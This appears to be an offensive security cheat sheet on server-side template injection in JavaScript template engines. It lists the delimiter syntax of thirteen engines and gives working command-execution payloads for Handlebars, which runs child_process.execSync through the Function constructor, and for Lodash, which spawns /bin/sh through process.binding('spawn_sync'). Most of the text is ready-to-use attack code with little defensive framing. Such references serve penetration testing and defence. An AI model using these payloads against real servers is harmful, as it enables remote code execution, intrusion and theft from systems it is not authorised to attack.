# Server Side Template Injection - JavaScript

## Summary

- [Templating Libraries](#templating-libraries)
- [Handlebars](#handlebars)
    - [Handlebars - Command Execution](#handlebars---command-execution)
- [Lodash](#Lodash)
    - [Lodash - Basic Injection](#lodash---basic-injection)
    - [Lodash - Command Execution](#lodash---command-execution)


## Templating Libraries

| Template Name | Payload Format |
| ------------ | --------- |
| DotJS        | `{{= }}`  |
| DustJS       | `{}`      |
| EJS          | `<% %>`   |
| HandlebarsJS | `{{ }}`   |
| HoganJS      | `{{ }}`   |
| Lodash       | `{{= }}`  |
| MustacheJS   | `{{ }}`   |
| NunjucksJS   | `{{ }}`   |
| PugJS        | `#{}`     |
| TwigJS       | `{{ }}`   |
| UnderscoreJS | `<% %>`   |
| VelocityJS   | `#=set($X="")$X` |
| VueJS        | `{{ }}`   |


## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Command Execution

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Command Execution

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

---

